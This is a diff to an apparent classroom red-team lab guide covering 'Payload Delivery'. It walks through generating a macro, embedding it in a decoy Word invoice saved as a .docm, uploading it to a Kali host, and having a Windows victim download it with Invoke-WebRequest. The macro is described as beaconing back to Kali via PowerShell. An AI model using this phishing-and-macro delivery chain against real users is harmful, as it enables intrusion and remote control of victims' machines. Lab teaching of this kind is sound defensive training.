@@ -352,16 +352,15 @@ Show students side-by-side: real site vs cloned — they look identical.
 
 ## Phase 6 — Payload Delivery
 
-**Attacker — Terminal 4 (Kali)**
+### Step 1 — Generate the macro (Kali, Terminal 4)
 
-Generate the macro code and decoy document:
 ```bash
 python3 tools/create_macro_doc.py
-# Creates: payloads/invoice_Q4_2024.docx   (decoy shell)
-#          payloads/macro_code.vba          (VBA to embed)
+# Creates: payloads/invoice_Q4_2024.docx   (decoy document)
+#          payloads/macro_code.vba          (VBA with your Kali IP baked in)
 ```
 
-Review what the macro does — walk through it with students:
+Review what the macro does with students:
 ```bash
 cat payloads/macro_code.vba
 ```
@@ -370,19 +369,32 @@ Three things happen the moment the victim clicks "Enable Content":
 2. `macro_ran.txt` is written to `%TEMP%` — artifact on disk
 3. A PowerShell one-liner silently beacons back to Kali
 
-**Embed the macro in LibreOffice (Terminal 4):**
-```bash
-libreoffice --writer payloads/invoice_Q4_2024.docx
+### Step 2 — Embed the macro (Windows attacker machine)
+
+Download both files from Kali in your browser:
 ```
-Inside LibreOffice:
-1. Tools → Macros → Edit Macros
-2. Paste the full content of `payloads/macro_code.vba` into Module1
-3. File → Save As → `invoice_Q4_2024.docm` (macro-enabled format)
-4. Close LibreOffice
+http://<Kali IP>:8080/payloads/invoice_Q4_2024.docx
+http://<Kali IP>:8080/payloads/macro_code.vba
+```
 
-The `.docm` is now in `payloads/` — http_server.py is already serving it.
+Open `invoice_Q4_2024.docx` in **Microsoft Word**, then:
+1. `Alt + F11` — opens the VBA editor
+2. In the left panel: right-click the document → **Insert → Module**
+3. Paste the full content of `macro_code.vba` into the module
+4. Close the VBA editor
+5. **File → Save As** → choose type **Word Macro-Enabled Document (*.docm)** → save as `invoice_Q4_2024.docm`
 
-**Victim — download and open on Windows:**
+### Step 3 — Upload the .docm to Kali
+
+From Windows PowerShell (OpenSSH is built-in on Windows 10/11):
+```powershell
+scp invoice_Q4_2024.docm kali@<Kali IP>:~/red4blue/lesson1/payloads/
+```
+
+http_server.py is already serving the `payloads/` folder — the file is immediately available.
+
+### Step 4 — Victim opens the document (Windows)
+
 ```powershell
 Invoke-WebRequest -Uri "http://<Kali IP>:8080/payloads/invoice_Q4_2024.docm" `
                   -OutFile "$env:TEMP\invoice_Q4_2024.docm"
